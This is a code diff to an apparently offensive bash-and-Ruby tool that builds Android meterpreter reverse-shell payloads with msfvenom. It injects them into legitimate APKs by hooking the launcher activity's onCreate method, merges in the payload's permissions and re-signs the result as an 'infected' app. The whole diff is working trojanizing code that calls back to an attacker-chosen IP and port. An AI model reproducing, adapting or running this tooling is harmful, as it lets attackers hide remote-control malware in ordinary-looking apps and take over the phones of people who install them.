@@ -169,20 +169,69 @@ UPLOAD() {
 
 # INJECT METERPRETER INTO LEGITIMATE APK
 INJECTION(){
+	VISIBLE_INJECTION() {
+		if [[ -z $PAYLOAD_IP ]]; then
+			echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE IP IN WHICH THE PAYLOAD WILL CONNECT BACK TO [${CYAN}${SERV}${NONE}${BOLD}]: ${NONE}"
+			read PAYLOAD_IP
+		fi
+		if [[ -z $PAYLOAD_PORT ]]; then
+			echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE PORT [${CYAN}${PAYLOAD_PORT}${NONE}${BOLD}]: ${NONE}"
+			read PAYLOAD_PORT
+		fi
+		if [[ -z $PAYLOAD_NAME ]]; then
+			echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE NAME OF THE OUTPUT PAYLOAD -WITHOUT .APK- [${CYAN}${PAYLOAD_NAME}${NONE}${BOLD}]: ${NONE}"
+			read PAYLOAD_NAME
+		fi
+		echo -e "CREATING PAYLOAD ... [${BOLD}WAIT${NONE}]"
+		msfvenom --platform android -a dalvik -p android/meterpreter/reverse_tcp LHOST=${PAYLOAD_IP} LPORT=${PAYLOAD_PORT} R > ${WDIR}/bin/Payloads/unsigned_${PAYLOAD_NAME}.apk
+		java -jar ${WDIR}/bin/signapk.jar ${WDIR}/bin/testkey.x509.pem ${WDIR}/bin/testkey.pk8 ${WDIR}/bin/Payloads/unsigned_${PAYLOAD_NAME}.apk ${WDIR}/bin/Payloads/Signed/${PAYLOAD_NAME}.apk
+		PAYLOAD="${WDIR}/bin/Payloads/Signed/${PAYLOAD_NAME}.apk"
+		echo -e "CREATING PAYLOAD ... [${GREEN}OK${NONE}]"
+		echo -e "[${PAYLOAD}]"
+		PAYLOAD_INT
+	}
+
 if [[ -z $LEGITIMATE_APK ]]; then
 	echo -e -n "${CYAN}WP${NONE}> ${BOLD}ENTER THE LEGITIMATE APK TO USE WITH FULL PATH: ${NONE}"
 	read LEGITIMATE_APK
 fi
-	/usr/bin/env ruby <<-EORUBY
+if [[ -z $PAYLOAD ]]; then
+	echo -e "               ${NONE}NO PAYLOAD WAS SPECIFIED IN CONFIG FILE, HOWEVER ...${NONE}"
+	if [ `find ${WDIR}/bin/Payloads/Signed -prune -empty` ];then
+		echo -e "${RED}COULD NOT FIND ANY PAYLOAD${NONE}"
+		echo -e -n "\n${CYAN}WP${NONE}> ${BOLD}CREATE ONE NOW? [${CYAN}Y${NONE}${BOLD}/${CYAN}N${NONE}${BOLD}]: ${NONE}"
+		read CREATE_PAYLOAD
+		case "$CREATE_PAYLOAD" in
+			y|Y|YES|yes) echo -e -n "${CYAN}WP${NONE}> ${BOLD}HIDDEN OR VISIBLE? [${CYAN}H${NONE}${BOLD}/${CYAN}V${NONE}${BOLD}]: ${NONE}" && read HV
+			case "$HV" in
+				H|h) HIDDEN_INJECTION ;;
+				v|V) VISIBLE_INJECTION ;;
+			esac ;;
+			N|n|NO|no) PAYLOAD_INT ;;
+		esac
+	else
+		NUM_PAYLOADS=$(find ${WDIR}/bin/Payloads/Signed/ -mindepth 1 -type f -name "*.apk" -exec printf x \; | wc -c)
+		echo -e "${BOLD}FOUND ${CYAN}${NUM_PAYLOADS}${NONE}${BOLD} SIGNED PAYLOADS:${NONE}"
+		echo -e "${CYAN}WP${NONE}> ${BOLD}ENTER THE NUMBER OF THE PAYLOAD YOU WANT TO USE:${NONE}"
+		select PAYLOAD_NAME in `ls -l ${WDIR}/bin/Payloads/Signed/*.apk | awk -F "/" '{print $NF}' | rev | cut -b 5- | rev`; do
+			PAYLOAD=${WDIR}/bin/Payloads/Signed/${PAYLOAD_NAME}.apk
+			echo -e "\n\n${BOLD}PLEASE WAIT ...${NONE}"
+			break
+		done
+	fi
+fi
+
+injected_apk=$(basename "$LEGITIMATE_APK" .apk)
+injected_apk="${injected_apk}_bd.apk"
+# MODIFIED CODE FROM SkullTech
+/usr/bin/env ruby - <<EORUBY
 require 'nokogiri'
 require 'fileutils'
-require 'optparse'
-
-# FIND ACTIVITY
-def FIND_ACTIVITY(amanifest)
+# Find the activity thatapk_backdoor.rb  is opened when you click the app icon
+def findlauncheractivity(amanifest)
     package = amanifest.xpath("//manifest").first['package']
     activities = amanifest.xpath("//activity|//activity-alias")
-    for activity in activities 
+    for activity in activities
         activityname = activity.attribute("name")
         category = activity.search('category')
         unless category
@@ -201,9 +250,12 @@ def FIND_ACTIVITY(amanifest)
     end
 end
 
-def RECURSE_SEARCH()
+# If XML parsing of the manifest fails, recursively search
+# the smali code for the onCreate() hook and let the user
+# pick the injection point
+def scrapeFilesForLauncherActivity()
 	smali_files||=[]
-	Dir.glob('Legitimate/smali*/**/*.smali') do |file|
+	Dir.glob('${WDIR}/bin/Payloads/Legitimate/smali*/**/*.smali') do |file|
 	  checkFile=File.read(file)
 	  if (checkFile.include?";->onCreate(Landroid/os/Bundle;)V")
 		smali_files << file
@@ -212,14 +264,11 @@ def RECURSE_SEARCH()
 	  end
 	end
 	i=0
-	print "[*] Please choose from one of the following:\n"
 	smali_files.each{|s_file|
-		print "[+] Hook point ",i,": ",s_file,"\n"
 		i+=1
 	}
 	hook=-1
 	while (hook < 0 || hook>i)
-		print "\nHook: "
 		hook = STDIN.gets.chomp.to_i
 	end
 	i=0
@@ -236,12 +285,10 @@ def RECURSE_SEARCH()
 	}
 	return [smalifile,activitysmali]
 end
-
-def IMPORT_PERMISSIONS()
+def fix_manifest()
 	payload_permissions=[]
-
 	#Load payload's permissions
-	File.open("payload/AndroidManifest.xml","r"){|file|
+	File.open("${WDIR}/bin/Payloads/Payload/AndroidManifest.xml","r"){|file|
 		k=File.read(file)
 		payload_manifest=Nokogiri::XML(k)
 		permissions = payload_manifest.xpath("//manifest/uses-permission")
@@ -251,26 +298,24 @@ def IMPORT_PERMISSIONS()
 		end
 	#	print "#{k}"
 	}
-	Legitimate_permissions=[]
+	original_permissions=[]
 	apk_mani=''
-
 	#Load Legitimate apk's permissions
-	File.open("Legitimate/AndroidManifest.xml","r"){|file2|
+	File.open("${WDIR}/bin/Payloads/Legitimate/AndroidManifest.xml","r"){|file2|
 		k=File.read(file2)
 		apk_mani=k
-		Legitimate_manifest=Nokogiri::XML(k)
-		permissions = Legitimate_manifest.xpath("//manifest/uses-permission")
+		original_manifest=Nokogiri::XML(k)
+		permissions = original_manifest.xpath("//manifest/uses-permission")
 		for permission in permissions
 			name=permission.attribute("name")
-			Legitimate_permissions << name.to_s
+			original_permissions << name.to_s
 		end
 	#	print "#{k}"
 	}
 	#Get permissions that are not in Legitimate APK
 	add_permissions=[]
 	for permission in payload_permissions
-		if !(Legitimate_permissions.include? permission)
-			print "[*] Adding #{permission}\n"
+		if !(original_permissions.include? permission)
 			add_permissions << permission
 		end
 	end
@@ -288,57 +333,43 @@ def IMPORT_PERMISSIONS()
 			new_mani << line+"\n"
 		end
 	end
-	File.open("Legitimate/AndroidManifest.xml", "w") {|file| file.puts new_mani }
+	File.open("${WDIR}/bin/Payloads/Legitimate/AndroidManifest.xml", "w") {|file| file.puts new_mani }
 end
-LEGITIMATE_APK = "$LEGITIMATE_APK"
-print "[*] DECOMPILING ORIGNAL APK ...\n"
-`apktool d $LEGITIMATE_APK -o $WDIR/tmp/Legitimate`
-print "[*] DECOMPILING PAYLOAD APK ...\n"
-`apktool d $PAYLOAD -o $WDIR/tmp/$PAYLOAD_NAME`
-
-f = File.open("Legitimate/AndroidManifest.xml")
-amanifest = Nokogiri::XML(f)
+apkfile="$LEGITIMATE_APK"
+unless(apkfile && File.readable?(apkfile))
+	puts "THE FILE WAS NOT FOUND OR WAS NOT READABLE\n"
+	exit(1)
+end
+`apktool d -f ${LEGITIMATE_APK} -o ${WDIR}/bin/Payloads/Legitimate`
+`apktool d -f ${PAYLOAD} -o ${WDIR}/bin/Payloads/Payload`
+f = File.open("${WDIR}/bin/Payloads/Legitimate/AndroidManifest.xml")
+amanifest=Nokogiri::XML(f)
 f.close
-
-print "[*] LOCATING onCreate() HOOK ...\n"
-
-
-launcheractivity = FIND_ACTIVITY(amanifest)
-smalifile = 'Legitimate/smali/' + launcheractivity.gsub(/\./, "/") + '.smali'
+launcheractivity = findlauncheractivity(amanifest)
+smalifile = '${WDIR}/bin/Payloads/Legitimate/smali/' + launcheractivity.gsub(/\./, "/") + '.smali'
 begin
 	activitysmali = File.read(smalifile)
 rescue Errno::ENOENT
-	print "[!] UNABLE TO FIND CORRECT HOOK AUTOMATICALLY.\n"
 	begin
-		results=RECURSE_SEARCH()
+		results=scrapeFilesForLauncherActivity()
 		smalifile=results[0]
 		activitysmali=results[1]
 	rescue
-		puts "[-] ERROR FINDING LAUNCHER ACTIVITY."
-		PAYLOAD_INT
+		puts "[-] ERROR FINDING LAUNCHER ACTIVITY. EXITING ..."
+		exit(1)
 	end
 end
-
-print "[*] COPYING PAYLOAD FILES ...\n"
-FileUtils.mkdir_p('Legitimate/smali/com/metasploit/stage/')
-FileUtils.cp Dir.glob('$WDIR/tmp/$PAYLOAD_NAME/smali/com/metasploit/stage/Payload*.smali'), 'Legitimate/smali/com/metasploit/stage/'
+FileUtils.mkdir_p('${WDIR}/bin/Payloads/Legitimate/smali/com/metasploit/stage/')
+FileUtils.cp Dir.glob('${WDIR}/bin/Payloads/Payload/smali/com/metasploit/stage/Payload*.smali'), '${WDIR}/bin/Payloads/Legitimate/smali/com/metasploit/stage/'
 activitycreate = ';->onCreate(Landroid/os/Bundle;)V'
 payloadhook = activitycreate + "\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
 hookedsmali = activitysmali.gsub(activitycreate, payloadhook)
-print "[*] LOADING ",smalifile," AND INJECTING PAYLOAD ...\n"
 File.open(smalifile, "w") {|file| file.puts hookedsmali }
-injected_apk=LEGITIMATE_APK.split(".")[0]
-injected_apk+="_backdoored.apk"
-
-print "[*] POISONING THE MANIFEST WITH METERPRETER PERMISSIONS ...\n"
-IMPORT_PERMISSIONS()
-
-print "[*] REBUILDING #{LEGITIMATE_APK} WITH METERPRETER INJECTION AS #{injected_apk} ...\n"
-`apktool b -f -o $WDIR/bin/Payloads/#{injected_apk} $WDIR/tmp/Legitimate`
-print "[*] SIGNING #{injected_apk} ...\n"
-`java -jar $WDIR/bin/signapk.jar ${WDIR}/bin/testkey.x509.pem ${WDIR}/bin/testkey.pk8 $WDIR/bin/Payloads/#{injected_apk} $WDIR/bin/Payloads/Signed/#{injected_apk}`
-
-puts "[+] INFECTED FILE $WDIR/bin/Payloads/Signed/#{injected_apk} READY.\n"
+fix_manifest()
+`apktool b -f ${WDIR}/bin/Payloads/Legitimate -o ${WDIR}/bin/Payloads/${injected_apk}`
+`java -jar ${WDIR}/bin/signapk.jar ${WDIR}/bin/testkey.x509.pem ${WDIR}/bin/testkey.pk8 ${WDIR}/bin/Payloads/${injected_apk} $WDIR/bin/Payloads/Signed/${injected_apk}`
+outdir = "${WDIR}/bin/Payloads/Signed/${injected_apk}"
+puts "[+] Infected file ready as [#{outdir}].\n"
 EORUBY
 }
 
@@ -398,8 +429,8 @@ RELAUNCH() {
 			echo -e "${BOLD}FOUND ${CYAN}${NUM_PAYLOADS}${NONE}${BOLD} SIGNED PAYLOADS:${NONE}"
 			echo -e "${CYAN}WP${NONE}> ${BOLD}ENTER THE NUMBER OF THE PAYLOAD YOU WANT TO USE:${NONE}"
 			select PAYLOAD_NAME in `ls -l ${WDIR}/bin/Payloads/Signed/*.apk | awk -F "/" '{print $NF}' | rev | cut -b 5- | rev`; do
-			PAYLOAD=${WDIR}/bin/Payloads/Signed/${PAYLOAD_NAME}.apk
-			INSTALL
+				PAYLOAD=${WDIR}/bin/Payloads/Signed/${PAYLOAD_NAME}.apk
+				INSTALL
 			done
 		fi
 	else
@@ -697,7 +728,7 @@ if [[ $# > 0 ]]; then
 									else
 										BHL
 									fi
-								 fi 
+								 fi
 								 # REMOTE EXTRACTION
 								 if [[ $2 == "remote" ]]; then
 								 	if [[ $# > 2 ]]; then
